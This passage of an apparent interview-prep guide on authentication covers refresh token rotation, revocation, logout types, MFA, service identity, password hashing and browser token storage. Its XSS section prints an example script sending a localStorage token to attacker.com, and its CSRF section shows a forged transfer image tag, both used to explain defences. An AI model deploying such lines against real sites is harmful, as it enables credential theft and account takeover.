| Standard (15 min)    | Acceptable for most APIs    | Moderate                      | Standard practice with refresh tokens             |
| Long (hours–days)    | Large revocation gap        | Low                           | Simpler clients; risky for sensitive resources    |

The right window depends on two variables: how sensitive the resource is, and whether refresh tokens are in use. For most APIs, 15 minutes with refresh token rotation is the correct default. For administrative or financial operations, consider shorter windows (5 min) or supplementing with token introspection.

Never use long-lived access tokens as a shortcut to avoid implementing refresh token handling. The entire value of the short-expiry model collapses if the access token lasts hours.

### Refresh Tokens

A refresh token is a long-lived credential the client uses to obtain new access tokens without re-authenticating the user. It is presented to the AS's token endpoint, not to the resource server.

```
Client                        Authorization Server
  │                                   │
  │── POST /token ──────────────────▶ │
  │   grant_type=refresh_token        │
  │   refresh_token=8xLOxBtZp8        │
  │   client_id=abc                   │
  │   client_secret=secret            │
  │                                   │
  │◀─ { new_access_token,             │
  │     new_refresh_token,  ←── rotation (if enabled)
  │     expires_in } ─────────────── │
```

Refresh tokens are issued only by flows that involve a user (Authorization Code, Device Authorization). The Client Credentials flow does not issue refresh tokens — the client simply re-authenticates when the access token expires.

**Refresh token expiry:** Two models exist:

- **Absolute expiry:** refresh token expires after a fixed duration (e.g., 90 days) regardless of use. User must re-authenticate after 90 days.
- **Sliding window:** each successful use of the refresh token extends its lifetime. Active users never need to re-authenticate; inactive users are eventually logged out naturally.

### Refresh Token Rotation

_Each use of a refresh token invalidates it and issues a new one — enabling theft detection when a superseded token is replayed._

Every time a refresh token is used, the AS invalidates it and issues a new one. The client must store and use only the most recent refresh token.

```
Initial grant:   refresh_token = RT-1
Use RT-1      → new access_token + RT-2 (RT-1 invalidated)
Use RT-2      → new access_token + RT-3 (RT-2 invalidated)
```

#### Reuse Detection — Theft Identification

Rotation enables automatic theft detection. If a refresh token has already been rotated (used), and an attacker presents the old one:

```
Legitimate client holds: RT-3
Attacker stole and holds: RT-2 (already rotated)

Attacker uses RT-2 → AS sees RT-2 was already used → detects reuse
                   → AS revokes the entire token family (RT-1 through RT-N)
                   → both legitimate client and attacker are logged out
```

This is the correct response: the AS cannot determine which party is legitimate, so it revokes the whole lineage and forces re-authentication. The user notices they've been logged out — this is the signal that theft occurred.

Token families (lineages) are tracked by linking each new refresh token to its predecessor. Any reuse of a superseded token triggers family-wide revocation.

> ⚠️ **Warning / Gotcha**
> Rotation creates a narrow race condition: if the network drops after the AS issues the new refresh token but before the client stores it, the client loses access and must re-authenticate. This is an acceptable trade-off. The alternative — no rotation — means a stolen refresh token is valid indefinitely. Some AS implementations handle this with a short reuse window (accept a token for N seconds after it's been rotated) to tolerate network retries, but this comes at a small security cost.

### Token Revocation Strategies

#### Short-Lived Access Tokens

The simplest strategy: accept that revocation is delayed, and limit the damage window by keeping access tokens short-lived. No additional infrastructure. The right default for most systems.

#### Revocation Endpoint (RFC 7009)

The AS exposes a `/revoke` endpoint. The client (or AS itself on logout) calls it to mark a token invalid.

```
POST /revoke
  token=eyJ...
  token_type_hint=access_token
  client_id=abc
  client_secret=secret
```

The AS marks the token as revoked in its internal store. The resource server still needs to know about this — by itself, RFC 7009 only tells the AS. The RS learns via introspection.

#### Token Introspection (RFC 7662)

The resource server calls the AS on each request to check whether the token is currently valid.

```
POST /introspect
  token=eyJ...
  client_id=rs-client
  client_secret=rs-secret

Response:
{
  "active": true,
  "sub": "42",
  "scope": "read:posts",
  "exp": 1700003600
}
```

Provides real-time validity — revocation is effective immediately. The cost: one AS call per resource server request. Mitigate with short-duration caching of introspection results (30–60 seconds) to avoid hammering the AS.

#### `jti` Blocklist in Redis

For JWT access tokens: store revoked `jti` values in Redis with a TTL equal to the token's remaining lifetime.

```python
def verify_token(token):
    claims = jwt.decode(token, public_key, algorithms=["RS256"])
    if redis.exists(f"revoked:{claims['jti']}"):
        raise TokenRevokedException()
    return claims

def revoke_token(jti, remaining_ttl):
    redis.setex(f"revoked:{jti}", remaining_ttl, "1")
```

Adds one Redis read to every verification. Acceptable overhead for high-security endpoints. Blocklist entries auto-expire when the token would have expired anyway — no cleanup job needed.

#### Per-User Token Version

Store a `token_version` integer on the user record. Embed it as a claim in the JWT. On verification, fetch the user's current version and compare.

```python
def verify_token(token):
    claims = jwt.decode(token, public_key, algorithms=["RS256"])
    user = db.get_user(claims['sub'])
    if claims['token_version'] != user.token_version:
        raise TokenRevokedException()
    return claims

def force_logout_all_sessions(user_id):
    db.increment(f"users.{user_id}.token_version")
```

Revokes all tokens for a user simultaneously (force logout all devices). One DB read per request. Coarser than `jti` blocklist — cannot revoke a single token, only all tokens for a user.

### Logout — Local vs Federated vs Back-Channel

"Logging out" means different things at different layers. Doing only one layer leaves the user partially authenticated elsewhere.

#### Local Logout

Clear the token or session from the client (delete cookie, clear localStorage, discard in-memory token). For session-based auth, delete the server-side session record. For JWTs, the access token remains cryptographically valid until `exp` — local logout only removes the client's copy.

This is the minimum. Sufficient for simple single-application setups where the IdP session is irrelevant.

#### Federated Logout (RP-Initiated Logout)

The client (Relying Party) redirects the user to the AS's end-session endpoint, ending the IdP session as well.

```
GET https://auth.example.com/logout
  ?id_token_hint=eyJ...           ← identifies which session to end
  &post_logout_redirect_uri=https://app.example.com/logged-out
  &state=abc123
```

The AS terminates the user's session at the IdP. If the user had SSO sessions with other applications through the same AS, those sessions may also be terminated (depending on AS configuration). After this, a new login attempt will require re-authentication at the IdP.

#### Back-Channel Logout (OIDC Back-Channel Logout)

The AS proactively notifies all registered Relying Parties that a session has ended, server-to-server. No browser involvement.

```
AS sends POST to each RP's registered back-channel logout URI:
  logout_token=eyJ...   ← signed JWT with sid (session ID) and sub

RP receives logout_token:
  validates signature, iss, aud
  finds all local sessions tied to this sid or sub
  invalidates them
```

More reliable than front-channel logout (which embeds logout URIs in iframes in the user's browser — iframes may be blocked, browser may be closed). Back-channel logout works even if the user closed their browser tab immediately after logout.

> ⚖️ **Decision Framework**
>
> | Logout Type              | Kills Local Session | Kills IdP Session | Notifies Other Apps           | Browser Required |
> | ------------------------ | ------------------- | ----------------- | ----------------------------- | ---------------- |
> | Local only               | Yes                 | No                | No                            | Yes              |
> | Federated (RP-initiated) | Yes                 | Yes               | No (other apps keep sessions) | Yes              |
> | Back-channel             | Yes                 | Yes               | Yes                           | No               |
>
> For any SSO deployment (multiple apps sharing the same IdP), back-channel logout is necessary for complete session termination. Without it, logging out of App A leaves the user silently logged into App B.

> 🎯 **Interview Lens** > **Q:** A user reports they can still access the system after logging out. What went wrong?
> **Ideal answer:** Several possibilities in order of likelihood: (1) Only local logout was performed — the JWT access token was removed from the client but is still cryptographically valid. A leaked copy can still be used. (2) Federated logout wasn't triggered — the IdP session is alive, and another tab or device can still get new tokens without re-authentication. (3) Back-channel logout isn't implemented — other apps sharing the IdP still have live sessions. Fix: implement all three logout layers appropriate to the architecture, and shorten access token TTL to limit the window for residual valid tokens.
> **Common trap:** "Delete the cookie and you're done." Only true for session-based auth. For JWT-based auth, deleting the cookie removes the client's copy but doesn't invalidate the token.
> **Next question:** "How do you handle logout for a user on multiple devices?" → Back-channel logout at the IdP level propagates to all RP sessions. For JWT-based systems without an IdP, increment the user's `token_version` in the DB — all tokens from all devices are invalidated on the next verification.

**Key Takeaway:** Short-lived access tokens (15 min) with refresh token rotation is the correct baseline. Rotation enables theft detection via reuse — when a rotated token is replayed, revoke the whole family. Logout has three layers; most bugs come from only implementing one.

---

## Multi-Factor Authentication

**Interviewer TL;DR:** MFA adds a second verification layer that an attacker cannot satisfy with a stolen password alone. TOTP and SMS are both phishable — WebAuthn/Passkeys are the only widely-deployed phishing-resistant factor. Know the mechanics of each and the threat model each one addresses (and fails to address).

**Mental model:** Factors are classified by what you know (password), what you have (phone, hardware key), and what you are (biometric). MFA requires at least two distinct factor categories — two passwords are not MFA.

### TOTP — How It Works

_A 6-digit code derived from a shared secret and the current 30-second time window — no network required at verification time._

TOTP (Time-based One-Time Password, RFC 6238) generates a 6-digit code that changes every 30 seconds, derived from a shared secret and the current time.

#### Mechanics

TOTP is built on HOTP (HMAC-based OTP, RFC 4226):

```
HOTP(secret, counter) = truncate(HMAC-SHA1(secret, counter))
TOTP(secret, time)    = HOTP(secret, floor(unix_timestamp / 30))
```

The counter in TOTP is the number of 30-second windows elapsed since Unix epoch. Both the authenticator app and the server independently compute the same value — no communication required at verification time.

**Enrollment:**

1. Server generates a random 160-bit secret
2. Secret is encoded as a QR code (`otpauth://totp/...?secret=BASE32...`)
3. User scans with authenticator app (Google Authenticator, Authy) — app stores the secret
4. Server also stores the secret, tied to the user's account

**Verification:** The server independently computes TOTP for the current time window and compares against the user-submitted code. It checks ±1 adjacent windows to tolerate clock skew between the authenticator app and server — a 90-second effective acceptance window. Wider windows increase the attack surface.

#### Threat Model

TOTP provides "what you have" (the device with the secret). It does not protect against:

- **Real-time phishing:** attacker presents a fake login page, relays credentials and TOTP code to the real site within the 30-second window. The code is valid — TOTP is not phishing-resistant.
- **Device theft:** if the phone is unlocked and unencrypted, the attacker has the second factor.
- **Secret exfiltration:** if the server's stored TOTP secrets are leaked, all users' second factors are compromised. Secrets must be encrypted at rest.

**Backup codes:** Generate 8–10 single-use backup codes at enrollment. Store hashed (bcrypt). If the user loses their device, backup codes are the only recovery path without an account reset flow.

### WebAuthn / Passkeys

_Public key cryptography bound to the origin domain — the private key never leaves the device and cannot be used on a phishing site._

WebAuthn (Web Authentication, W3C spec) uses asymmetric key cryptography. The private key never leaves the authenticator device. The server stores only the public key.

#### Registration

```
1. Server generates a random challenge and sends it with relying party info:
   { challenge: "abc...", rp: { id: "example.com", name: "Example" }, ... }

2. Authenticator (hardware key, platform authenticator) generates a key pair:
   private_key  → stored securely on device (hardware-bound, not exportable)
   public_key   → sent to server along with credential ID and attestation

3. Server stores: { credential_id, public_key, user_id, rp_id: "example.com" }
```

#### Authentication

```
1. Server sends a fresh challenge

2. Authenticator signs the challenge + client data with the private key:
   signature = sign(private_key, challenge + client_data_hash)

3. Server verifies:
   verify(public_key, signature, challenge + client_data_hash)
   → if valid: authentication succeeds
```

Nothing sensitive is transmitted. The credential never leaves the device. The server never sees the private key.

#### Why It's Phishing-Resistant

The credential is **origin-bound**. The `rp_id` (relying party ID) is the domain the credential was registered for. The authenticator refuses to sign a challenge if the current origin doesn't match the registered `rp_id`.

A phishing site at `examp1e.com` cannot request a signature from a credential registered for `example.com` — the authenticator rejects it. This is a hardware-enforced property, not a software check that can be bypassed.

#### Passkeys

Passkeys are synced WebAuthn credentials — the private key is protected by the platform (iCloud Keychain, Google Password Manager) and synchronized across the user's devices. The UX is the same as hardware-bound WebAuthn (biometric prompt), but credentials survive device loss.

The security trade-off: synced credentials are only as secure as the platform account protecting the sync (iCloud password + Apple ID MFA). Hardware-bound keys (FIDO2 security keys like YubiKey) are more secure but require physical possession.

|                      | TOTP              | WebAuthn (hardware)    | Passkeys                     |
| -------------------- | ----------------- | ---------------------- | ---------------------------- |
| Phishing-resistant   | No                | Yes                    | Yes                          |
| Device loss recovery | Backup codes      | Replace key, re-enroll | Restore from platform backup |
| Server-side secret   | Yes (TOTP secret) | No                     | No                           |
| Sync across devices  | App-dependent     | No                     | Yes                          |
| UX friction          | Code entry        | Tap key / biometric    | Biometric                    |

### SMS OTP — Why It's Weak

SMS delivers a one-time code to the user's phone number. It is widely deployed but has fundamental weaknesses at the protocol layer.

**SS7 vulnerability:** The telecom signaling protocol (Signaling System 7, designed in 1975) has no authentication between carriers. An attacker with access to the SS7 network — achievable through a rogue carrier or a compromised telco employee — can intercept SMS messages destined for any number globally.

**SIM swap:** The attacker contacts the carrier, social-engineers or bribes a customer service representative, and transfers the victim's number to a SIM the attacker controls. All subsequent SMS messages (including OTPs) go to the attacker. This attack has been used in high-profile account takeovers of cryptocurrency exchanges and email accounts.

**Real-time relay:** Same phishing weakness as TOTP — an attacker can relay the SMS code to the real site within the validity window.

**Malware interception:** Android apps with `READ_SMS` permission can silently read OTP messages.

NIST SP 800-63B classifies SMS OTP as a "restricted authenticator" — permissible but not recommended. Agencies using it must assess the risk, notify users, and offer alternatives.

SMS OTP is still significantly better than password-only authentication. The guidance is not "never use SMS OTP" but "do not use it as the only MFA option, and prefer TOTP or WebAuthn when possible."

### Step-Up Authentication

Step-up is a pattern where an existing authenticated session must re-verify with a stronger factor before accessing a sensitive resource — without requiring a full logout and re-login.

**When to use:** The user's base session (authenticated with password) is sufficient for reading data. A higher-assurance action (wire transfer, admin operation, account deletion) requires step-up.

#### Implementation

OIDC defines `acr_values` (Authentication Context Class Reference) and `amr` (Authentication Methods References) to express authentication strength:

```
acr_values: basic   ← password only
acr_values: mfa     ← MFA required
```

```
1. User is authenticated with password (acr: basic)
   Token contains: { "acr": "basic", "amr": ["pwd"] }

2. User attempts a sensitive action (POST /transfer)

3. Resource server checks: required_acr=mfa, token_acr=basic → insufficient
   Returns 403 with step-up challenge:
   { "error": "insufficient_user_authentication",
     "acr_values": "mfa" }

4. Client redirects to AS with:
   GET /authorize?...&acr_values=mfa&prompt=login

5. AS prompts for second factor (TOTP / WebAuthn)
   Issues new token: { "acr": "mfa", "amr": ["pwd", "otp"] }

6. Client retries the sensitive action with the new token → accepted
```

#### Time-Bounding Step-Up

Step-up tokens for sensitive operations should carry a tighter `exp` than the base access token. A gold-level token valid for 15 minutes that was issued 14 minutes ago should not be accepted for a new sensitive action — the AS can embed an `auth_time` claim (time of the last authentication event) and the resource server can check how recent it was.

> 🎯 **Interview Lens** > **Q:** How would you design MFA for a banking application?
> **Ideal answer:** Baseline authentication with password + TOTP or WebAuthn for all logins. Step-up authentication for high-value actions (transfers, beneficiary changes) requiring re-verification of the second factor, with a short step-up token TTL (5 min). WebAuthn preferred over TOTP for phishing resistance. SMS OTP only as a fallback with explicit risk acceptance. Backup codes for account recovery, stored hashed. Enforce `acr` claims at the resource server, not just at the client.
> **Common trap:** "Add MFA to the login form and you're done." Misses step-up auth for sensitive operations — an attacker who hijacks a session after the MFA checkpoint can still perform high-value actions.
> **Next question:** "How do you handle a user who loses their second factor device?" → Pre-issued backup codes (primary recovery). Secondary: identity verification via customer support with out-of-band verification (photo ID, account history questions). Do not allow email-only recovery — email account compromise would bypass MFA entirely.

**Key Takeaway:** TOTP is the practical default; WebAuthn/Passkeys are the correct long-term answer for phishing resistance. SMS OTP is a fallback with known weaknesses — acceptable as an option, not as a primary MFA method. Step-up authentication is the pattern that extends MFA coverage beyond login to sensitive in-session operations.

---

## Service-to-Service Authentication

**Interviewer TL;DR:** Machine identities are harder than user identities because there's no human in the loop to verify or rotate credentials. API keys are simple but operationally fragile. mTLS and SPIFFE/SPIRE solve the rotation problem through automation. The right choice depends on whether you control both sides of the connection and how much infrastructure you're willing to operate.

**Mental model:** Service-to-service auth asks the same question as user auth — prove who you are — but the prover is a process, not a person. The challenge is that secrets embedded in processes leak silently and are rotated with operational friction.

### API Keys

An API key is a shared secret the client includes in every request. The server looks it up against a store to identify and authorize the caller.

```
GET /api/v1/reports
Authorization: Bearer sk_live_4f3a9b2e1c...
# or
X-API-Key: sk_live_4f3a9b2e1c...
```

**Prefixes for scannable detection:** Prefix keys with a recognizable string (`sk_live_`, `ghp_`, `npm_`). GitHub, Stripe, and npm use this pattern. Allows automated scanning of source code and commit history to detect accidental key exposure — and immediately revoke before damage is done.

**Storage:** Store only the hash (SHA-256) of the key. On verification, hash the received key and compare. If the store is breached, attackers get hashes, not usable keys.

```python
import hashlib, secrets

def create_api_key():
    raw_key = "sk_live_" + secrets.token_urlsafe(32)
    key_hash = hashlib.sha256(raw_key.encode()).hexdigest()
    db.store({"hash": key_hash, "scope": "reports:read", "created_at": now()})
    return raw_key   # shown to user once, never stored again

def verify_api_key(raw_key):
    key_hash = hashlib.sha256(raw_key.encode()).hexdigest()
    return db.find_by_hash(key_hash)
```

**Rotation without downtime:** Support two active keys per credential at any time. The caller generates a new key, adds it alongside the old one, migrates services, then revokes the old key. Immediate revocation on compromise is still possible — delete the key record.

**Limitations:** No built-in expiry, no cryptographic proof of who is calling (only that they have the key), no fine-grained identity beyond what the key record says. Appropriate for third-party external integrations and webhook endpoints. Not appropriate for internal service mesh traffic where better options exist.

### mTLS

Standard TLS authenticates the server to the client — the server presents a certificate and the client verifies it. mTLS (mutual TLS) adds the reverse: the client also presents a certificate, and the server verifies it. Both sides prove their identity during the TLS handshake.

```
Client                              Server
  │── ClientHello ────────────────▶ │
  │◀─ ServerHello + ServerCert ──── │
  │── ClientCert + Finished ──────▶ │  ← client proves its identity
  │◀─ Finished ───────────────────  │
  │                                 │
  │  Mutual authentication complete │
  │  Application data encrypted     │
```

The server validates the client certificate against its trusted CA. The certificate encodes the client's identity (Common Name or Subject Alternative Name). No API keys, no tokens — identity is established at the connection layer before any application code runs.

**The operational challenge is PKI** — running a CA, issuing short-lived certs, rotating before expiry, revoking on decommission. In practice, service meshes (Istio, Linkerd) automate this entirely: each sidecar proxy gets a cert issued by the mesh CA, rotated transparently, without any application-layer TLS code. For PKI lifecycle, CRL/OCSP, and service mesh integration details, see [mTLS](./mtls.md).

> ⚖️ **Decision Framework**
> mTLS is the right choice when: you control both sides of the connection, you're operating a service mesh or can add one, and you want transport-level identity without application-layer token management. Without automation (cert-manager, Istio), manual cert rotation across many services is the failure mode — the operational burden defeats the security benefit.

### JWT with Service Accounts

Service accounts are non-human identities tied to a service or workload. A service authenticates by presenting a signed JWT that asserts its identity, which an authorization server or target service validates.

**Google Cloud Platform pattern:**

```
1. GCP creates a service account: my-service@project.iam.gserviceaccount.com
2. Service downloads a key file (JSON with private key)
   — or — uses Workload Identity (preferred: no key file)

3. Service constructs and signs a JWT:
   {
     "iss": "my-service@project.iam.gserviceaccount.com",
     "sub": "my-service@project.iam.gserviceaccount.com",
     "aud": "https://target-api.example.com",
     "iat": 1700000000,
     "exp": 1700003600
   }
   signed with the service account's private key

4. Target service fetches Google's public keys (JWKS) and validates the signature
```

**Kubernetes ServiceAccount tokens:**

Kubernetes projects an OIDC-compatible token into each pod at a known path:

```
/var/run/secrets/kubernetes.io/serviceaccount/token
```

The token is automatically rotated by the kubelet. Services read it and present it to other services or the Kubernetes API. With IAM Roles for Service Accounts (IRSA on AWS, Workload Identity on GCP), the pod's Kubernetes identity is federated to a cloud IAM role — the pod gets cloud credentials without storing any key material.

The key pattern: no long-lived secrets embedded in the process. Credentials are short-lived, rotated automatically by the platform, and tightly scoped.

### SPIFFE / SPIRE

_Platform-agnostic workload identity: each service gets a cryptographic SVID automatically, rotated continuously, with no secrets in config files._

SPIFFE (Secure Production Identity Framework For Everyone) is a CNCF standard for workload identity in heterogeneous infrastructure. SPIRE (SPIFFE Runtime Environment) is the reference implementation.

**Problem it solves:** In a dynamic environment (Kubernetes pods, EC2 instances, Lambda functions), services come and go. Assigning and rotating credentials manually doesn't scale. SPIFFE provides a cryptographic identity to each workload automatically, regardless of the underlying platform.

**SPIFFE ID:** A URI that uniquely identifies a workload:

```
spiffe://trust-domain/path/to/workload

Examples:
spiffe://payments.example.com/frontend
spiffe://payments.example.com/db-writer
```

**SVID (SPIFFE Verifiable Identity Document):** The credential that encodes a SPIFFE ID. Two formats:

- **X.509-SVID:** A TLS certificate with the SPIFFE ID in the Subject Alternative Name URI field. Used for mTLS between workloads.
- **JWT-SVID:** A short-lived JWT with the SPIFFE ID as the `sub` claim. Used for HTTP-based authentication.

**How SPIRE works:**

```
SPIRE Server  ←─ operator configures workload attestation rules
     │
     │  (trust domain CA, issues SVIDs)
     │
SPIRE Agent   ←─ runs on each node (DaemonSet in k8s)
     │
     │  workload attestation: verifies the process
     │  (checks: this is pod X in namespace Y with label Z)
     │
Workload      ←─ fetches SVID via Workload API (Unix socket)
     │              SVID is auto-rotated before expiry
     ▼
Presents X.509-SVID in mTLS handshake to target service
Target fetches SPIFFE bundle (public keys) from SPIRE and validates
```

**Key properties:**

- Short-lived SVIDs (hours, not days) automatically rotated — compromise window is narrow
- Platform-agnostic: works across Kubernetes, VMs, bare metal, Lambda
- No secrets in environment variables or config files — credentials delivered via local socket
- Integrates with Envoy, Istio, and AWS/GCP workload identity

> 🎯 **Interview Lens** > **Q:** How do you authenticate services in a microservices system without sharing long-lived secrets?
> **Ideal answer:** Two options depending on complexity tolerance. For a service mesh environment: mTLS with automatic cert rotation via Istio or Linkerd — identity is in the certificate, rotation is automated, no application-layer token management. For heterogeneous or multi-cloud: SPIFFE/SPIRE — platform-agnostic workload identity, short-lived X.509 SVIDs rotated automatically, no secrets in config. Both avoid the core problem with API keys: a long-lived secret that leaks silently and is painful to rotate.
> **Common trap:** "Use API keys per service." Follow-up: "How do you rotate them without downtime?" and "What happens if one is leaked?" The candidate then describes a manual process that doesn't scale past a few services.
> **Next question:** "How does a newly deployed pod prove its identity to SPIRE before it has any credentials?" → This is workload attestation. SPIRE Agent uses platform-specific evidence (Kubernetes pod UID, node metadata, service account projection) to verify the workload's claimed identity before issuing any SVID. The agent has a trusted channel to the SPIRE Server; the workload only communicates with the local agent via Unix socket.

**Key Takeaway:** API keys are the right choice for external integrations — simple, immediately revocable. For internal service mesh: mTLS with automated rotation removes long-lived secrets from the picture. SPIFFE/SPIRE is the answer when you need workload identity across heterogeneous infrastructure without per-platform credential management.

---

## Credential Storage & Transmission

**Interviewer TL;DR:** Passwords must be hashed with a slow, memory-hard algorithm — Argon2id is the current recommendation. Token storage is a trade-off between XSS and CSRF exposure: HttpOnly cookies are immune to XSS theft but require CSRF mitigations; localStorage is immune to CSRF but readable by any JavaScript on the page.

**Mental model:** Storage decisions are about which attacker you're defending against. The XSS attacker runs JavaScript in your page's context. The CSRF attacker tricks the user's browser into making requests. No single storage location defeats both — design explicitly for the threat model.

### Password Hashing

#### Why Fast Hashes Are Wrong

MD5, SHA-1, and SHA-256 are designed to be fast. Modern GPUs compute billions of SHA-256 hashes per second. A leaked database of SHA-256 password hashes is crackable in hours for any password under 8 characters.

The correct countermeasures are:

1. **Salting** — unique random value per user, stored alongside the hash. Prevents precomputed rainbow table attacks. Every user's hash is unique even if passwords are identical.
2. **Slow hashing** — algorithms deliberately tuned to be computationally expensive, making brute-force attacks orders of magnitude slower.

#### bcrypt

Work-factor-tunable hash based on the Blowfish cipher. The cost parameter (4–31) doubles computation time for each increment. Cost 12 takes ~250ms on modern hardware — acceptable for user-facing login, prohibitive for bulk cracking.

```python
import bcrypt

def hash_password(plaintext: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(plaintext.encode(), salt)

def verify_password(plaintext: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(plaintext.encode(), hashed)
```

**72-byte truncation:** bcrypt silently truncates passwords at 72 bytes. Two passwords that share the same first 72 bytes will produce the same hash. For users with very long passwords, this is a silent collision. Mitigation: pre-hash with SHA-256 (hex-encoded, keeping output under 72 bytes) before passing to bcrypt — but this requires careful implementation to avoid introducing new issues.

#### Argon2

Winner of the Password Hashing Competition (2015). Memory-hard by design — requires significant RAM, which defeats GPU and ASIC parallelisation (GPU cores have limited per-core memory).

Three variants:

- **Argon2d:** optimized against GPU attacks; vulnerable to side-channel timing attacks — not for password hashing
- **Argon2i:** resistant to side-channel attacks; weaker against GPU — for key derivation where timing matters
- **Argon2id:** hybrid of d and i. Recommended for password hashing (OWASP, NIST SP 800-63B)

```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=2,        # iterations
    memory_cost=65536,  # 64 MB of RAM
    parallelism=2,      # threads
    hash_len=32,
    salt_len=16
)

hashed = ph.hash("user_password")
ph.verify(hashed, "user_password")   # raises if invalid
```

OWASP minimum recommended parameters: `time_cost=2, memory_cost=19456` (19 MB), `parallelism=1`. Increase `memory_cost` as hardware improves — the hash output format stores the parameters, so old hashes remain verifiable while new ones use stronger settings.

#### scrypt

Memory-hard predecessor to Argon2. Parameters: N (CPU/memory cost), r (block size), p (parallelism). Still widely used; Argon2id is preferred for new systems.

| Algorithm    | Memory-Hard | Side-Channel Resistant | Recommended                         |
| ------------ | ----------- | ---------------------- | ----------------------------------- |
| bcrypt       | No          | Yes                    | Legacy systems, still acceptable    |
| scrypt       | Yes         | Partial                | Acceptable; prefer Argon2id for new |
| Argon2id     | Yes         | Yes                    | Current recommendation              |
| MD5 / SHA-\* | No          | —                      | Never for passwords                 |

#### Pepper

A server-side secret added to the password before hashing — stored in an environment variable or secrets manager, not in the database.

```python
import os, hashlib

PEPPER = os.environ["PASSWORD_PEPPER"]

def hash_password(plaintext: str) -> bytes:
    peppered = plaintext + PEPPER
    return bcrypt.hashpw(peppered.encode(), bcrypt.gensalt(rounds=12))
```

If the database is leaked without the application server being compromised, the attacker has hashes but not the pepper — offline cracking is blocked entirely, not just slowed. Rotating the pepper requires re-hashing on next login (since the old hash can't be verified without the old pepper).

#### Algorithm Upgrade Path

When migrating from MD5 or bcrypt to Argon2id: on each successful login, verify with the old algorithm, then immediately re-hash with the new one and update the stored hash. Users who never log in retain old hashes until they do. Optionally: identify remaining old-algorithm hashes and force a password reset after a deadline.

### Token Storage — Cookies vs localStorage vs Memory

| Storage             | XSS Readable        | Sent Automatically      | Persists                  | CSRF Risk                 |
| ------------------- | ------------------- | ----------------------- | ------------------------- | ------------------------- |
| HttpOnly cookie     | No                  | Yes (same + cross-site) | Yes                       | Yes — requires mitigation |
| Non-HttpOnly cookie | Yes                 | Yes                     | Yes                       | Yes                       |
| localStorage        | Yes                 | No                      | Yes (across tabs/restart) | No                        |
| sessionStorage      | Yes                 | No                      | No (tab only)             | No                        |
| In-memory (JS var)  | Yes (if XSS active) | No                      | No (lost on refresh)      | No                        |

**HttpOnly cookie:** The access token or session ID is set in an HttpOnly cookie by the server. JavaScript cannot read it (`document.cookie` excludes HttpOnly cookies). XSS cannot steal the credential directly. The browser sends it automatically with every same-origin request. CSRF protection (SameSite + CSRF token) is required.

**localStorage:** Persists across tabs and page refreshes. Readable by any JavaScript in the same origin — XSS can read it with `localStorage.getItem('token')`. Not sent automatically — must be explicitly attached to each request (`Authorization: Bearer ...`). The explicit attachment means CSRF is not a risk (cross-site requests don't automatically include localStorage values).

**In-memory:** Stored in a JavaScript variable. Lost on page refresh. XSS can still read it if the attacker can execute code at the time the variable exists, but it's not persisted anywhere. The most ephemeral option.

### CSRF & XSS Implications by Storage Choice

#### CSRF (Cross-Site Request Forgery)

An attacker tricks the victim's browser into sending a request to your site. The browser automatically includes cookies — if the auth token is in a cookie, the forged request carries valid credentials.

**Attack:**

```html
<!-- Attacker's site -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000" />
<!-- Browser sends bank.example.com cookies automatically — valid auth -->
```

**Mitigations:**

1. **SameSite=Lax/Strict:** Modern browser default. `Lax` blocks cookies on cross-site sub-resource requests (XHR, fetch, iframe) but allows them on top-level navigations. Stops the above attack entirely.

2. **CSRF token (synchronizer token pattern):** Server generates an unpredictable token, stores it in the session, and sends it in the HTML response (not a cookie). The client includes it in a custom header or form field. Server validates it on state-changing requests. A cross-site attacker cannot read the HTML response (same-origin policy) so cannot get the token.

3. **Custom request header:** For APIs, simply require a custom header (`X-Requested-With: XMLHttpRequest`). Browsers don't send custom headers on cross-site requests without a CORS preflight — and the server rejects preflighted cross-origin requests. Lightweight, no token management needed.

#### XSS (Cross-Site Scripting)

An attacker injects JavaScript that runs in the page's origin context. From that context, the script can read localStorage, sessionStorage, and in-memory variables. It cannot read HttpOnly cookies.

**Attack:**

```javascript
// Injected script running in victim's browser on your domain
fetch(
  "https://attacker.com/steal?token=" + localStorage.getItem("access_token")
);
```

**Mitigations:**

1. **Content Security Policy (CSP):** HTTP header that restricts which scripts can execute. A strict CSP (`script-src 'self'`) blocks inline scripts and scripts from external origins — neutralises most XSS injection vectors.

2. **Output encoding:** Encode all user-controlled content before rendering in HTML. Prevents injection of executable markup.

3. **HttpOnly cookies for the most valuable credentials:** Even with XSS present, the attacker cannot read an HttpOnly cookie. The access token may be stolen from memory, but the refresh token (higher value, longer-lived) stored in an HttpOnly cookie is safe.

#### Recommended Pattern for SPAs

```
Refresh token  → HttpOnly, Secure, SameSite=Strict cookie
                 (never accessible to JavaScript, survives page refresh)

Access token   → in-memory JavaScript variable
                 (lost on refresh — silently renewed via refresh token)
                 (if XSS occurs, the 15-minute access token is exposed,
                  but the refresh token is protected)
```

On page load: a silent request to `/token/refresh` (which sends the HttpOnly refresh token cookie automatically) retrieves a new access token into memory. The user never notices. XSS can steal the in-memory access token but has at most 15 minutes of use. The refresh token is out of reach.

> 🎯 **Interview Lens** > **Q:** Where should a SPA store its auth tokens?
> **Ideal answer:** Split storage by token lifetime and value. Refresh token in an HttpOnly Secure cookie — immune to XSS theft, browser sends it automatically to the refresh endpoint. Access token in memory — lost on page refresh but silently renewed via the refresh cookie. This maximises protection on the high-value credential (refresh token) while keeping the short-lived access token out of persistent storage. CSRF mitigations (SameSite=Strict on the refresh cookie) cover the cookie's attack surface.
> **Common trap:** "Store both in localStorage for simplicity." XSS anywhere on the domain steals both tokens permanently — the refresh token gives indefinite access until manually revoked.
> **Next question:** "What happens when the user refreshes the page if the access token is in memory?" → On page load, the app silently calls the token refresh endpoint. The HttpOnly refresh cookie is sent automatically. A new access token is returned and stored in memory. From the user's perspective: seamless. This requires the refresh endpoint to be accessible with only cookie credentials.

**Key Takeaway:** Argon2id is the correct algorithm for new systems — memory-hard, side-channel resistant, tunable. For token storage: HttpOnly cookies protect against XSS; non-cookie storage protects against CSRF. The split pattern (refresh token in HttpOnly cookie, access token in memory) gives the best of both for SPAs.

---

## Production Failure Modes

### Session Store Unavailability — Mass Logout

Redis goes down. Every authenticated request fails the session lookup. Every user is effectively logged out simultaneously.

**Why it's non-obvious:** The application may not have an explicit "Redis is down" code path — it just fails to find sessions and returns 401. From the user's perspective, the site appears broken with no clear error.

